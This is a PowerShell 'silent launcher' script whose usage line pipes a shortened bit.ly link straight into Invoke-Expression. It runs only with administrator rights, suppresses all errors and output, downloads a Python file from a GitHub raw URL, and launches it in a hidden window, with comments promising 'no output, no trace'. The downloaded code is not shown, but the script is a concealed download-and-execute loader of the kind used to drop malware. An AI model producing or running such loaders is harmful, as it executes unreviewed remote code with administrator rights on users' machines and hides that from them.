# NOBLE SETUP - Silent Launcher
# Usage: irm https://bit.ly/4dbqqti | iex

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Check admin silently
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    # Silently exit - no output
    exit
}

# Create temp directory
$tempDir = Join-Path $env:TEMP "BraxInstaller"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

# Download setup.py silently
$pyUrl = "https://raw.githubusercontent.com/beatboxe17x-sys/setupn/refs/heads/main/setup.py"
$pyPath = Join-Path $tempDir "setup.py"

try {
    Invoke-WebRequest -Uri $pyUrl -OutFile $pyPath -UseBasicParsing | Out-Null
} catch {
    exit
}

# Check Python silently
$python = Get-Command pythonw -ErrorAction SilentlyContinue
if (-not $python) {
    $python = Get-Command python -ErrorAction SilentlyContinue
}

if (-not $python) {
    exit
}

# Install tkinter silently if needed
& $python.Source -c "import tkinter" 2>$null
if ($LASTEXITCODE -ne 0) {
    & $python.Source -m pip install tk -q --no-warn-script-location 2>$null | Out-Null
}

# Launch GUI with NO CONSOLE WINDOW
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $python.Source
$psi.Arguments = "`"$pyPath`""
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false
[System.Diagnostics.Process]::Start($psi) | Out-Null

# Exit immediately - no output, no trace
exit
